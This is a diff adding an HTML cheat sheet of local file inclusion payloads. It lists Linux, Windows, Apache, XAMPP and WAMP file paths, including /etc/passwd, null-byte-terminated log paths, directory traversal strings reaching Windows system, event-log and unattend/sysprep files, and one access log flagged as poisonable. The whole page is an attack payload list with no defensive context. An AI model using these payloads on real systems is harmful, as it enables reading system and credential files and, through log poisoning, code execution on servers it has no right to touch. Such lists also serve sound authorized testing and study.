@@ -1,0 +1,59 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Files for LFI</title>
+</head><body><b><span style="font-size: 12pt">!!! USE BOTH TYPES OF SLASHES !!!<br/>
+<br/>
+Linux<br/>
+</span></b><br/>
+<tt>/etc/passwd<br/>
+</tt><tt>/etc/hosts</tt><br/>
+<br/>
+<b>Apache<br/>
+</b><br/>
+RHEL / Red Hat / CentOS / Fedora Linux<br/>
+<tt>/var/log/httpd/access_log%00</tt><br/>
+<br/>
+Debian / Ubuntu<br/>
+<tt>/var/log/apache2/access.log%00</tt><br/>
+<br/>
+FreeBSD<br/>
+<tt>/var/log/httpd-access.log%00</tt><br/>
+<br/>
+more in<br/>
+<tt>/usr/share/wordlists/fuzzdb/attack/disclosure-localpaths/unix/common-unix-httpd-log-locations.txt</tt><br/>
+<span style="font-size: 12pt"><b><br/>
+<br/>
+</b></span><span style="font-size: 12pt"><b>Windows</b></span><tt><br/>
+</tt><br/>
+WINNT directory for Windows NT(2000 etc)<br/>
+<tt><br/>
+boot.ini<br/>
+</tt><tt>\windows\win.ini</tt><br/>
+<br/>
+<tt>../../../../../../../WINDOWS/system32/drivers/etc/hosts<br/>
+../../../../../../../WINDOWS/system32/win.ini<br/>
+<br/>
+../../../../../../../WINDOWS/system32/debug/NetSetup.log<br/>
+../../../../../../../WINDOWS/system32/config/AppEvent.Evt<br/>
+../../../../../../../WINDOWS/system32/config/SecEvent.Evt<br/>
+../../../../../../../WINDOWS/Panther/unattend.txt<br/>
+../../../../../../../WINDOWS/Panther/unattend.xml<br/>
+../../../../../../../WINDOWS/Panther/unattended.xml<br/>
+../../../../../../../WINDOWS/Panther/sysprep.inf<br/>
+../../../../../../../WINDOWS/system32/prodspec.ini<br/>
+<br/>
+</tt><b>XAMPP<br/>
+</b><tt><br/>
+</tt><tt>/xampp/apache/conf/httpd.conf</tt>		(apache configuration)<br/>
+<tt>/xampp/apache/logs/access.log</tt>		(apache logfile - can be poisoned)<br/>
+<tt>C:\xampp\htdocs\</tt>			(web root)<br/>
+<tt>C:\xampp\www\</tt>				(web root)<br/>
+<br/>
+<b>WAMP</b><br/>
+<tt><br/>
+/wamp/logs/access.log<br/>
+/wamp/logs/apache_error.log<br/>
+/wamp/logs/mysql.log<br/>
+/wamp/logs/php_error.log<br/>
+</tt></body></html>
